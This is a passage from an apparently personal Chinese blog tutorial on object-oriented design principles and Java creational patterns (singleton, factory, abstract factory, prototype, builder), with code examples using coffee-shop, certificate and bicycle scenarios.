的皮肤是输入法背景图片、窗口颜色和声音等元素的组合。用户可以根据自己的喜爱更换自己的输入法的皮肤，也可以从网上下载新的皮肤。这些皮肤有共同的特点，可以为其定义一个抽象类（AbstractSkin），而每个具体的皮肤（DefaultSpecificSkin和HeimaSpecificSkin）是其子类。用户窗体可以根据需要选择或者增加新的主题，而不需要修改原代码，所以它是满足开闭原则的。\n里氏替换原则（LSP）里氏代换原则是面向对象设计的基本原则之一。里氏代换原则：任何基类可以出现的地方，子类一定可以出现。 通俗理解：子类可以扩展父类的功能，但不能改变父类原有的功能换句话说，子类继承父类时，除添加新的方法完成新增功能外，尽量不要重写父类的方法。如果通过重写父类的方法来完成新的功能，这样写起来虽然简单，但是整个继承体系的可复用性会比较差，特别是运用多态比较频案时，程序运行出错的概率会非常大，\n详细可以参考：细说 里氏替换原则里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化。而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。\n例如：在数学领域里，正方形毫无疑问是长方形，它是一个长宽相等的长方形。所以，我们开发的一个与几何图形相关的软件系统，就可以顺理成章的让正方形继承自长方形。但当需要增加长方形的宽度直至大于长度时（一些新的需要），正方形的代码便会出现问题。即正方形与长方形的继承关系违反了里氏替换原则，他们之间的继承关系不成立，正方形不是长方形。改进：正方形和长方形都继承四边形的接口\n依赖倒转原则（DIP）高层模块不应该依赖低层模块，两者都应该依赖其抽象：抽象不应该依赖细节，细节应该依赖抽象。简单的说就是要求对抽象进行编程，不要对实现进行编程，这样就降低了客户与实现模块间的耦合。\n例如：组装电脑现要组装一台电脑，需要配件，硬盘，内存条等。只有这些配置都有了，计算机才能正常的运行。选择cpu有很多选择，如Intel，AMD等，硬盘可以选择希捷，西数等，内存条可以选择金士顿，海盗船等。这时，应该将配件抽象化（接口或抽象类）。否则当配件修改时，电脑部分也需要修改（不符合开闭原则）。\n像下图这样设计会导致配件无法更换。改进：将需要的配件进行抽象。让电脑类依赖于各个配件的抽象，而不是直接依赖于各个配件的实现。\n接口隔离原则（ISP）客户不应该被迫依赖于它不使用的方法：一个类对另一个类的依赖应该建立在最小的接口上。ISP将大接口拆分为更小更具体的接口，以便客户取他们需要的。\n例如：安全门案例我们需要创建一个独立品牌的安全门，该安全门具有防火、防水、防盗的功能。可以将防火，防水，防盗功能提取成一个接口，形成一套规范。但当我们需要创建另一个安全门，只具有防火和防水功能时。就无法实现了。改进的方法就是：将防盗、防火、防水提取成的一个接口拆分成三个接口，以便客户只取需要的。\n迪米特法则（LOD）迪米特法则（Law of Demeter）又叫作最少知识原则（The Least Knowledge Principle）一个类对于其他类知道的越少越好，就是说一个对象应当对其他对象有尽可能少的了解。只和朋友通信，不和陌生人说话。（talk only to your immediate friends）其含义是：如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以通过第三方转发该调用。其目的是降低类之间的耦合度，提高模块的相对独立性。迪米特法则中的“朋友“是指：当前对象本身、当前对象的成员对象、当前对象所创建的对象、当前对象的方法参数等，这些对象同当前对象存在关联、聚合或组合关系，可以直接访问这些对象的方法。\n例如：明星与经纪人的关系实例明星由于全身心投入艺术，所以许多日常事务由经纪人负责处理，如和粉丝的见面会，和媒体公司的业务洽谈等。这里的经纪人是明星的朋友，而粉丝和媒体公司是陌生人，所以适合使用迪米特法则。\n合成复用原则（CRP）合成复用原则是指：尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现。通常类的复用分为继承复用和合成复用两种。\n继承复用虽然有简单和易实现的优点，但它也存在以下缺点：\n\n继承复用破坏了类的封装性，因为继承会将父类的实现细节暴幕给子类，父类对子类是透明的，所以这种复用又称为“白箱“复用。\n子类与父类的耦合度高。父类的实现的任何改变都会导致子类的实现发生变化，这不利于类的扩展与维护。\n它限制了复用的灵活性。从父类继承而来的实现是静态的，在编译时已经定义，所以在运行时不可能发生变化。\n\n采用组合或聚合复用时，可以将已有对象纳入新对象中，使之成为新对象的一部分，新对象可以调用已有对象的功能，它有以下优点：\n\n它维持了类的封装性。因为成分对象的内部细节是新对象看不见的，所以这种复用又称为“黑箱“复用。\n对象间的桐合度低。可以在类的成员位置声明抽象。\n复用的灵活性高。这种复用可以在运行时动态进行，新对象可以动态地引用与成分对象类型相同的对象。\n\n例如：汽车分类管理程序汽车按“动力源“划分可分为汽油汽车、电动汽车等；按“颜色“划分可分为白色汽车、黑色汽车和红色汽车等。如果同时考虑这两种分类，其组合就很多。所以可以将颜色以接口的方式实现，汽车类实现颜色接口，在创建汽车时传入颜色对象。可以减少很多子类的产生。\n创建者模式创建型模式的主要关注点是“怎样创建对像？”，它的主要特点是“将对象的创建与使用分离”。这样可以降低系统的糯合度，使用者不需要关注对象的创建细节。创建型模式分为：\n\n单例模式\n工厂方法模式\n抽象工程模式\n原型模式\n建造者模式\n\n单例设计模式单例模式(Singleton Pattern)是Java中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。\n单例模式的结构单例模式的主要有以下角色：\n\n单例类。只能创建一个实例的类\n访问类。使用单例类\n\n单例模式的实现\n单例设计模式分类两种：\n\n饿汉式：类加载就会导致该单实例对象被创建\n懒汉式：类加载不会导致该单实例对象被创建，而是首次使用该对象时才会创建\n\n\n\n饿汉式（静态变量） public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 本类中创建本类对象    private static Singleton instance = new Singleton();    // 提供一个公共的访问方式，让外界获取对象    public static Singleton getInstance()&#123;        return instance;    &#125;&#125;\n\n该方式中 instance 对象随类加载而创建，如果对象足够大，而且一直没有使用就会造成内存的浪费。\n\n\n饿汉式（静态代码块） public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 声明Singleton类型的变量    private static Singleton instance;    // 静态代码块中赋值    static &#123;        instance = new Singleton();    &#125;    // 对外提供获取该对象的方法    public static Singleton getInstance()&#123;        return instance;    &#125;&#125;\n\n该方式与上面一样，也是随类加载而创建，也会造成内存的浪费。\n\n\n懒汉式（线程安全，在方法上加 synchronized 关键字）public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 声明    private static Singleton instance;    // 对外提供访问方式    public static synchronized Singleton getInstance()&#123;        if (instance==null)&#123;            instance = new Singleton();        &#125;        return instance;    &#125;&#125;\n懒汉式（双重检查锁）\n上一种方式虽然是线程安全的，但没必要让每个线程必须持有锁才能调用该方法。因为绝大部分操作都是读操作，读操作是线程安全的。所以需要调整加锁的时机。\n\n/** * 懒汉式 */public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 声明    private static Singleton instance;    // 对外提供访问方式    public static Singleton getInstance()&#123;        // 第一次判断        if (instance==null)&#123;            synchronized (Singleton.class)&#123;                // 第二次判断                if (instance == null) &#123;                    instance = new Singleton();                &#125;            &#125;        &#125;        return instance;    &#125;&#125;\n\n双重检查锁是很好的单例实现模式，解决了单例、性能、线程安全的问题。但上一种实现方式在多线程的情况下，可能会出现空指针的问题，因为JVM在实例化对象时会进行优化和指令重排序的操作。需要使用 volatile 关键字，volatile 可以保证可见性和有序性。在上面的代码中，给变量 instance 添加 volatile 关键字即可。是比较好的实现方式\n\n\n懒汉式（静态内部类）\n静态内部类单例模式中实例由内部类创建。因为JVM在加载外部类的过程中，不会加载静态内部类，只有内部类的属性&#x2F;方法被调用时才会被加载并初始化。静态属性由于被 static 修饰，保证只被实例化一次，并且严格保证实例化顺序。\n\npublic class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 定义一个静态内部类    private static class SingletonHolder&#123;        // 申明并初始化变量        private static final Singleton INSTANCE = new Singleton();    &#125;    // 对外提供访问方式    public static Singleton getInstance()&#123;        return SingletonHolder.INSTANCE;    &#125;&#125;\n\n是一种优秀的实现方式，比较常用在没有加任何锁的情况下，保证了线程安全，并且没有任何性能和空间的浪费。\n\n\n枚举方式\n枚举是线程安全的，并且只会装载一次。枚举类型是所有单例实现中唯一一种不会被破环的实现模式。属于饿汉式方式 \n\npublic enum Singleton &#123;    INSTANCE&#125;\n\n存在的问题破坏单例模式：使单例类可以创建多个对象，枚举方式除外。有两种方式：序列化和反射。\n序列化方式：\nimport java.io.*;public class Client &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        writeObjectFile();        Singleton instance = readObjectFile();        Singleton instance1 = readObjectFile();        System.out.println(instance==instance1);    &#125;    // 从文件读取数据    public static Singleton readObjectFile() throws IOException, ClassNotFoundException &#123;        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./a.txt&quot;));        Singleton instance = (Singleton) inputStream.readObject();        inputStream.close();        return instance;    &#125;    // 向文件中写数据    public static void writeObjectFile() throws IOException &#123;        Singleton instance = Singleton.getInstance();        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./a.txt&quot;));        outputStream.writeObject(instance);        outputStream.close();    &#125;&#125;\n\n反射模式：\nimport java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;public class Client &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;        // 获取字节码对象        Class&lt;Singleton&gt; c = Singleton.class;        // 获取无参构造方法        Constructor&lt;Singleton&gt; constructor = c.getDeclaredConstructor();        // 取消访问检查        constructor.setAccessible(true);        // 创建对象        Singleton instance = constructor.newInstance();        Singleton instance1 = constructor.newInstance();        System.out.println(instance == instance1);    &#125;&#125;\n\n解决方法：\n反序列化破坏的解决方式：在单例类中添加 readResolve() 方法，在反序列化时被反序列化方法调用。如果定义了这个方法，就返回这个方法的返回值，如果没有定义，则返回new出来的对象。\npublic class Singleton implements Serializable &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 本类中创建本类对象    private static Singleton instance = new Singleton();    // 提供一个公共的访问方式，让外界获取对象    public static Singleton getInstance()&#123;        return instance;    &#125;    // 当进行反序列化时，会自动调用该方法，将该方法返回值直接返回    public Object readResolve()&#123;        return instance;    &#125;&#125;\n\n反射破坏的解决方式：在单例类的无参构造方法中，判断是否是第一次创建。\npublic class Singleton implements Serializable &#123;    // 判断是否是第一次访问构造方法    private static boolean flag = false;    // 私有构造方法    private Singleton() &#123;        synchronized (Singleton.class) &#123;            if (flag) &#123;                throw new RuntimeException(&quot;不能创建多个对象&quot;);            &#125;            flag = true;        &#125;    &#125;    // 定义一个静态内部类    private static class SingletonHolder &#123;        // 申明并初始化变量        private static final Singleton INSTANCE = new Singleton();    &#125;    // 对外提供访问方式    public static Singleton getInstance() &#123;        return Singleton.SingletonHolder.INSTANCE;    &#125;&#125;\n\n关于懒汉式与饿汉式的区别：饿汉式：在类加载时就已经创建好单例对象，以供使用。懒汉式：只有在调用 getInstance 方法时才会创建对象。详细参考：单例模式中的懒汉模式和饿汉模式是什么？区别又是什么？\nRuntime 类中单例模式的应用Runtime 类：Runtime类封装了运行时的环境。每个 Java 应用程序都有一个 Runtime 类实例，使应用程序能够与其运行的环境相连接。一般不能实例化一个Runtime对象，应用程序也不能创建自己的 Runtime 类实例，但可以通过 getRuntime 方法获取当前Runtime运行时对象的引用。一旦得到了一个当前的Runtime对象的引用，就可以调用Runtime对象的方法去控制Java虚拟机的状态和行为。Runtime 类是饿汉模式\nRuntime 部分源码（关于单例模式的部分）：\npublic class Runtime &#123;    private static final Runtime currentRuntime = new Runtime();    private static Version version;    /**     * Returns the runtime object associated with the current Java application.     * Most of the methods of class &#123;@code Runtime&#125; are instance     * methods and must be invoked with respect to the current runtime object.     *     * @return  the &#123;@code Runtime&#125; object associated with the current     *          Java application.     */    public static Runtime getRuntime() &#123;        return currentRuntime;    &#125;    /** Don&#x27;t let anyone else instantiate this class */    private Runtime() &#123;&#125;&#125;\n\n使用 demo。（运行 ipconfig 命令）\nimport java.io.IOException;import java.io.InputStream;public class RuntimeDemo &#123;    public static void main(String[] args) throws IOException &#123;        // 获取runtime对象        Runtime runtime = Runtime.getRuntime();        // 调用runtime的方法exec，参数为一个命令        Process process = runtime.exec(&quot;ipconfig&quot;);        // 调用process对象的获取输入流的方法        InputStream is = process.getInputStream();        byte[] arr = new byte[1024*1024*100];        // 读取数据        int len = is.read(arr);// 返回读到的字节数        // 将字节数组转换为字符串输出到控制台        System.out.println(new String(arr,0,len,&quot;GBK&quot;));    &#125;&#125;\n\n工厂模式需求：设计一个咖啡店点餐系统。设计一个咖啡类（Coffee），并定义其两个子类（美式咖啡【AmericanCoffee】和拿铁咖啡【LatteCoffee】）；再设计一个咖啡店类（CoffeeStore），咖啡店具有点咖啡的功能。\n在java中，万物皆对象，这些对象都需要创建，如果创建的时候直接new该对象，就会对该对象耦合严重，假如我们要更换对象，所有new对象的地方都需要修改一遍，这显然违背了软件设计的开闭原则。如果我们使用工厂来生产对象，我们就只和工厂打交道就可以了，彻底和对象解耦，如果要更换对象，直接在工厂里更换该对象即可，达到了与对象解耦的目的。所以说，工厂模式最大的优点就是：解耦。\n简单工厂模式简单工厂不是一种设计模式，而是更像一种编程习惯。\n结构简单工厂包含如下角色：\n\n抽象产品：定义了产品的规范，描述了产品的主要特性和功能。\n具体产品：实现或者继承抽象产品的子类\n具体工厂：提供了创建产品的方法，调用者通过该方法来创建产品。\n\n实现对咖啡店点餐系统的改进：\n\n工厂（factory）处理创建对象的细节，一旦有了SimpleCoffeeFactory，CoffeeStore类中的orderCoffee()就变成此对象的客户，后期如果需要Coffee对象直接从工厂中获取即可。这样也就解除了和Coffee实现类的耦合，同时又产生了新的耦合，CoffeeStore对象和SimpleCoffeeFactory工厂对象的耦合，工厂对象和商品对象的耦合。后期如果再加新品种的咖啡，我们势必要需求修改SimpleCoffeeFactory的代码，违反了开闭原则。工厂类的客户端可能有很多，比如创建美团外卖等，这样只需要修改工厂类的代码，省去其他的修改操作。\n\npublic class SimpleCoffeeFactory &#123;    public Coffee createCoffee(String type) &#123;        Coffee coffee = null;        if(&quot;americano&quot;.equals(type)) &#123;            coffee = new AmericanoCoffee();        &#125; else if(&quot;latte&quot;.equals(type)) &#123;            coffee = new LatteCoffee();        &#125;        return coffee;    &#125;&#125;\n\n优缺点优点：封装了创建对象的过程，可以通过参数获取对象。将对象的创建和业务逻辑分开，避免修改客户代码。如果需要实现新的产品，直接修改工厂类，省去其他修改操作。缺点：增加新产品，需要修改工厂类的代码，违反开闭原则。\n扩展：静态工厂即将工厂类中的创建对象的功能定义为静态的。\n工厂方法模式工厂方法模式可以完美解决简单工厂的缺点，完全遵循开闭原侧。\n概念定义一个用于创建对象的接口，让子类决定实例化哪个产品类对象。工厂方法使一个产品类的实例化延迟到其工厂的子类。\n结构工厂方法模式的主要角色：\n\n抽象工厂(Abstract Factory):提供了创建产品的接口，调用者通过它访问具体工厂的工厂方法来创建产品。\n具体工厂(ConcreteFactory):主要是实现抽象工厂中的抽象方法，完成具体产品的创建。\n抽象产品(Product):定义了产品的规范，描述了产品的主要特性和功能。\n具体产品(ConcreteProduct):实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间一一对应。\n\n实现对咖啡店点餐系统的改进：\n\n要增加产品类时也要相应地增加工厂类，不需要修改工厂类的代码了，这样就解决了简单工厂模式的缺点。工厂方法模式就是简单工厂模式的进一步抽象（将工厂进行抽象）。由于使用了多态，工厂方法模式保持了简单工厂模式的优点，克服了他的缺点。\n\n抽象工厂：\npublic interface CoffeeFactory &#123;    Coffee createCoffee();&#125;\n\n具体工厂：\npublic class LatteCoffeeFactory implements CoffeeFactory &#123;    public Coffee createCoffee() &#123;        return new LatteCoffee();    &#125;&#125;public class AmericanCoffeeFactory implements CoffeeFactory &#123;    public Coffee createCoffee() &#123;        return new AmericanCoffee();    &#125;&#125;\n\n咖啡店类：\npublic class CoffeeStore &#123;    private CoffeeFactory factory;        public CoffeeStore(CoffeeFactory factory) &#123;        this.factory = factory;    &#125;        public Coffee orderCoffee(String type) &#123;        Coffee coffee = factory.createCoffee();        coffee.addMilk();        coffee.addsugar();        return coffee;    &#125;&#125;\n\n优缺点优点：\n\n用户只需要知道具体工厂的名称就可得到所要的产品，无须知道产品的具体创建过程\n在系统增加新的产品时只需要添加具体产品类和对应的具体工厂类，无须对原工厂进行任何修改，满足开闭原侧；缺点：\n每增加一个产品就要增加一个具体产品类和一个对应的具体工厂类，这增加了系统的复杂度。\n\n抽象工厂模式前面介绍的工厂方法模式中考虑的是一类产品的生产，如畜牧场只养动物、电视机厂只生产电视机等。这些工厂只生产同种类产品，同种类产品称为同等级产品，也就是说：工厂方法模式只考虑生产同等级的产品，但是在现实生活中许多工厂是综合型的工厂，能生产多等级（种类）的产品，如电器厂既生产电视机又生产洗衣机或空调，大学既有软件专业又有生物专业等。抽象工厂模式将考虑多等级产品的生产，将同一个具体工所生产的位于不同等级的一组产品称为一个产品族。比如下图中，横轴是产品等级，也就是同一类产品；纵轴是产品族，也就是同一品牌的产品，同一品牌的产品产自同一个工厂。\n概念是一种为访问类提供一个创建阻相关或相互依赖对象的接口，且访问类无须指定所要产品的具体类就能得到同族的不同等级的产品的模式结构。抽象工厂模式是工厂方法模式的升级版本，工厂方法模式只生产一个等级的产品，而抽象工厂模式可生产多个等级的产品。\n结构抽象工厂模式的主要角色如下：\n\n抽象工厂(Abstract Factory):提供了创建产品的接口，它包含多个创建产品的方法，可以创建多个不同等级的产品。\n具体工厂(Concrete Factory):主要是实现抽象工厂中的多个抽象方法，完成具体产品的创建。\n抽象产品(Product)：定义了产品的规范，描述了产品的主要特性和功能，抽象工厂模式有多个抽象产品。\n具体产品(ConcreteProduct)：实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间是多对一的关系。\n\n实现现咖啡店业务发生改变，不仅要生产咖啡还要生产甜点，如提拉米苏、抹茶慕斯等，要是按照工厂方法模式，需要定义提拉米苏类、抹茶慕斯类、提拉米苏工厂、抹茶慕斯工厂、甜点工厂类，很容易发生类爆炸情况。其中拿铁咖啡、美式咖啡是一个产品等级，都是咖啡；提拉米苏、抹茶慕斯也是一个产品等级；拿铁咖啡和提拉米苏是同一产品族（也就是都属于意大利风味），美式咖啡和抹茶慕斯是同一产品族（也就是都属于美式风味）。所以这个案例可以使用抽象工厂模式实现。\n\n如果需要添加一个产品族，只需要再添加一个对应的工厂类即可，不需要修改其他的类。\n\n抽象工厂：\npublic interface DessertFactory &#123;    Coffee createCoffee();    Dessert createDessert();&#125;\n\n具体工厂：\n//美式甜点工厂public class AmericanDessertFactory implements DessertFactory &#123;    public Coffee createCoffee() &#123;        return new AmericanCoffee();    &#125;        public Dessert createDessert() &#123;        return new MatchaMousse();    &#125;&#125;//意大利风味甜点工厂public class ItalyDessertFactory implements DessertFactory &#123;    public Coffee createCoffee() &#123;        return new LatteCoffee();    &#125;        public Dessert createDessert() &#123;        return new Tiramisu();    &#125;&#125;\n\n优缺点优点：当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。缺点：当产品族中需要增加一个新的产品时，所有的工厂类都需要进行修改。\n使用场景\n当需要创建的对象是一系列相互关联或相互依赖的产品族时，如电器工厂中的电视机、洗衣机、空调等。\n系统中有多个产品族，但每次只使用其中的某一族产品。如有人只喜欢穿某一个品牌的衣服和鞋。\n系统中提供了产品的类库，且所有产品的接口相同，客户端不依赖产品实例的创建细节和内部结构。如：输入法换皮肤，一整套一起换。生成不同操作系统的程序。\n\n模式拓展简单工厂 + 配置文件解除耦合可以通过工厂模式 + 配置文件的方式解除工厂对象和产品对象的耦合在工厂类中加载配置文件中的全类名，并创建对象进行存储，客户端如果需要对象，直接进行获取即可。\n\n定义配置文件american=org.example.designPatterns.pattern.factory.configFactory.AmericanCoffeelatte=org.example.designPatterns.pattern.factory.configFactory.LatteCoffee\n改进工厂类import java.io.IOException;import java.io.InputStream;import java.util.HashMap;import java.util.Properties;import java.util.Set;public class CoffeeFactory &#123;    // 加载配置文件，获取配置文件中配置的全类名，并创建该类的对象进行存储    // 定义容器存储对象    private static HashMap&lt;String, Coffee&gt; map = new HashMap&lt;&gt;();    // 加载配置文件    static &#123;        // 创建Properties对象        Properties p = new Properties();        // 调用load方法加载配置文件        InputStream is = CoffeeFactory.class.getClassLoader().getResourceAsStream(&quot;bean.properties&quot;);        try &#123;            p.load(is);            // 从p集合中获取全类名，并创建对象            Set&lt;Object&gt; keys = p.keySet();            for (Object key : keys) &#123;                String className = p.getProperty((String) key);                // 通过反射创建对象                Class&lt;?&gt; clazz = Class.forName(className);                Coffee coffee = (Coffee) clazz.newInstance();                // 将名称和对象存储到容器中                map.put((String) key, coffee);            &#125;        &#125; catch (IOException | IllegalAccessException | InstantiationException | ClassNotFoundException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static Coffee createCoffee(String name) &#123;        return map.get(name);    &#125;&#125;\n\n静态成员变量用来存储创建的对象（键存储的是名称，值存储的是对应的对象），而读取配置文件以及创建对象写在静态代码块中，目的就是只需要执行一次。\nJDK中的工厂模式的应用（Collection.iterator）import java.util.LinkedList;import java.util.List;public class Main &#123;    public static void main(String[] args) &#123;        List&lt;String&gt; list = new LinkedList&lt;&gt;();        list.add(&quot;许嵩&quot;);        list.add(&quot;徐良&quot;);        list.add(&quot;汪苏泷&quot;);        // 获取迭代器对象        Iterator&lt;String&gt; iterator = list.iterator();        // 使用迭代器遍历        for (String element : list) &#123;            System.out.println(element);        &#125;    &#125;&#125;\n\n使用迭代器遍历集合，获取集合中的元素。而单列集合获取迭代器的方法就使用到了工厂方法模式。\nCollection接口是抽象工厂类，ArrayList是具体的工厂类；Iterator接口是抽象商品类，ArrayList类中的Iter内部类是具体的商品类。在具体的工厂类中iterator()方法创建具体的商品类的对象。\n\n1,DateForamt类中的getInstance()方法使用的是工厂模式；2,Calendar类中的getInstance()方法使用的是工厂模式；\n\n原型模式概述用一个已经创建的实例作为原型，通过复制该原型对象来创建一个和原型对象相同的新对象。\n结构原型模式包含如下角色：\n\n抽象原型类：规定了具体原型对象必须实现的的 clone() 方法。\n具体原型类：实现抽象原型类的 clone() 方法，它是可被复制的对象。\n访问类：使用具体原型类中的 clone() 方法来复制新的对象。\n\n\n实现原型模式的克隆分为浅克隆和深克隆。\n\n浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址。深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。\n\nJava中的Object类中提供了 clone() 方法来实现浅克隆。Cloneable 接口是上面的类图中的抽象原型类，而实现了Cloneable接口的子实现类就是具体的原型类。\nRealizetype（具体的原型类）：\npublic class Realizetype implements Cloneable &#123;    public Realizetype() &#123;        System.out.println(&quot;具体的原型对象创建完成！&quot;);    &#125;        @Override    protected Realizetype clone() throws CloneNotSupportedException &#123;        System.out.println(&quot;具体原型复制成功！&quot;);        return (Realizetype) super.clone();    &#125;&#125;\n\nPrototypeTest（测试访问类）：\npublic class PrototypeTest &#123;    public static void main(String[] args) throws CloneNotSupportedException &#123;        Realizetype r1 = new Realizetype();        Realizetype r2 = r1.clone();        System.out.println(&quot;对象r1和r2是同一个对象？&quot; + (r1 == r2));    &#125;&#125;\n\n案例用原型模式生成“三好学生”奖状同一学校的“三好学生”奖状除了获奖人姓名不同，其他都相同，可以使用原型模式复制多个“三好学生”奖状出来，然后在修改奖状上的名字即可。\n\n代码如下：\n//奖状类public class Citation implements Cloneable &#123;    private String name;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return (this.name);    &#125;    public void show() &#123;        System.out.println(name + &quot;同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！&quot;);    &#125;    @Override    public Citation clone() throws CloneNotSupportedException &#123;        return (Citation) super.clone();    &#125;&#125;//测试访问类public class CitationTest &#123;    public static void main(String[] args) throws CloneNotSupportedException &#123;        Citation c1 = new Citation();        c1.setName(&quot;张三&quot;);        //复制奖状        Citation c2 = c1.clone();        //将奖状的名字修改李四        c2.setName(&quot;李四&quot;);        c1.show();        c2.show();    &#125;&#125;\n\n使用场景\n对象的创建非常复杂，可以使用原型模式快捷的创建对象。\n性能和安全要求比较高。\n\n拓展（深克隆）因为浅克隆的属性和原来对象完全相同。对于基本类型：String、Integer 等包装类都是不可变的对象，当需要修改不可变对象的值时，需要在内存中生成一个新的对象来存放新的值，然后将原来的引用指向新的地址对于非基本类型（引用类型）：克隆的新对象的引用类型的属性仍会指向原来对象引用类型属性的内存地址\n实现深拷贝的两种方式：\n\n实现 Cloneable 接口\n实现 Serializable 接口\n\n详细的晚点新写一篇博客\n建造者模式概述将一个复杂对象的构建与表示分离，使得同样的构建过程可以创建不同的表示。\n\n分离了部件的构造(由Builder来负责)和装配(由Director负责)。 从而可以构造出复杂的对象。这个模式适用于：某个对象的构建过程复杂的情况。\n由于实现了构建和装配的解耦。不同的构建器，相同的装配，也可以做出不同的对象；相同的构建器，不同的装配顺序也可以做出不同的对象。也就是实现了构建算法、装配算法的解耦，实现了更好的复用。\n建造者模式可以将部件和其组装过程分开，一步一步创建一个复杂的对象。用户只需要指定复杂对象的类型就可以得到该对象，而无须知道其内部的具体构造细节。\n\n结构建造者（Builder）模式包含如下角色：\n\n抽象建造者类（Builder）：这个接口规定要实现复杂对象的那些部分的创建，并不涉及具体的部件对象的创建。\n具体建造者类（ConcreteBuilder）：实现 Builder 接口，完成复杂产品的各个部件的具体创建方法。在构造过程完成后，提供产品的实例。\n产品类（Product）：要创建的复杂对象。\n指挥者类（Director）：调用具体建造者来创建复杂对象的各个部分，在指导者中不涉及具体产品的信息，只负责保证对象各部分完整创建或按某种顺序创建。\n\n\n实例创建共享单车生产自行车是一个复杂的过程，它包含了车架，车座等组件的生产。而车架又有碳纤维，铝合金等材质的，车座有橡胶，真皮等材质。对于自行车的生产就可以使用建造者模式。这里Bike是产品，包含车架，车座等组件；Builder是抽象建造者，MobikeBuilder和OfoBuilder是具体的建造者；Director是指挥者。类图如下：\n\n//自行车类public class Bike &#123;    private String frame;    private String seat;    public String getFrame() &#123;        return frame;    &#125;    public void setFrame(String frame) &#123;        this.frame = frame;    &#125;    public String getSeat() &#123;        return seat;    &#125;    public void setSeat(String seat) &#123;        this.seat = seat;    &#125;&#125;// 抽象 builder 类public abstract class Builder &#123;    protected Bike mBike = new Bike();    public abstract void buildFrame();    public abstract void buildSeat();    public abstract Bike createBike();&#125;//摩拜单车Builder类public class MobikeBuilder extends Builder &#123;    @Override    public void buildFrame() &#123;        mBike.setFrame(&quot;铝合金车架&quot;);    &#125;    @Override    public void buildSeat() &#123;        mBike.setSeat(&quot;真皮车座&quot;);    &#125;    @Override    public Bike createBike() &#123;        return mBike;    &#125;&#125;//ofo单车Builder类public class OfoBuilder extends Builder &#123;    @Override    public void buildFrame() &#123;        mBike.setFrame(&quot;碳纤维车架&quot;);    &#125;    @Override    public void buildSeat() &#123;        mBike.setSeat(&quot;橡胶车座&quot;);    &#125;    @Override    public Bike createBike() &#123;        return mBike;    &#125;&#125;//指挥者类public class Director &#123;    private Builder mBuilder;    public Director(Builder builder) &#123;        mBuilder = builder;    &#125;    public Bike construct() &#123;        mBuilder.buildFrame();        mBuilder.buildSeat();        return mBuilder.createBike();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        showBike(new OfoBuilder());        showBike(new MobikeBuilder());    &#125;    private static void showBike(Builder builder) &#123;        Director director = new Director(builder);        Bike bike = director.construct();        System.out.println(bike.getFrame());        System.out.println(bike.getSeat());    &#125;&#125;\n\n上面示例是 Builder模式的常规用法，指挥者类 Director 在建造者模式中具有很重要的作用，它用于指导具体构建者如何构建产品，控制调用先后次序，并向调用者返回完整的产品类，但是有些情况下需要简化系统结构，可以把指挥者类和抽象建造者进行结合。但同时也会也加重了抽象建造者类的职责，也不是太符合单一职责原则，如果construct() 过于复杂，建议还是封装到 Director 中。\n// 抽象 builder 类public abstract class Builder &#123;    protected Bike mBike = new Bike();    public abstract void buildFrame();    public abstract void buildSeat();    public abstract Bike createBike();        public Bike construct() &#123;        this.buildFrame();        this.BuildSeat();        return this.createBike();    &#125;&#125;\n\n优缺点优点：\n\n建造者模式的封装性很好。使用建造者模式可以有效的封装变化，在使用建造者模式的场景中，一般产品类和建造者类是比较稳定的，因此，将主要的业务逻辑封装在指挥者类中对整体而言可以取得比较好的稳定性。\n在建造者模式中，客户端不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦，使得相同的创建过程可以创建不同的产品对象。\n可以更加精细地控制产品的创建过程 。将复杂产品的创建步骤分解在不同的方法中，使得创建过程更加清晰，也更方便使用程序来控制创建过程。\n建造者模式很容易进行扩展。如果有新的需求，通过实现一个新的建造者类就可以完成，基本上不用修改之前已经测试通过的代码，因此也就不会对原有功能引入风险。符合开闭原则。缺点：\n造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制。\n\n使用场景建造者（Builder）模式创建的是复杂对象，其产品的各个部分经常面临着剧烈的变化，但将它们组合在一起的算法却相对稳定，所以它通常在以下场合使用。\n\n创建的对象较复杂，由多个部件构成，各部件面临着复杂的变化，但构件间的建造顺序是稳定的。\n创建复杂对象的算法独立于该对象的组成部分以及它们的装配方式，即产品的构建过程和最终的表示是独立的。\n\n模式扩展建造者模式除了上面的用途外，在开发中还有一个常用的使用方式，就是当一个类构造器需要传入很多参数时，如果创建这个类的实例，代码可读性会非常差，而且很容易引入错误，此时就可以利用建造者模式进行重构。\n重构前代码：\npublic class PhoneBefore &#123;    private String cpu;    private String screen;    private String memory;    private String mainboard;    public PhoneBefore(String cpu, String screen, String memory, String mainboard) &#123;        this.cpu = 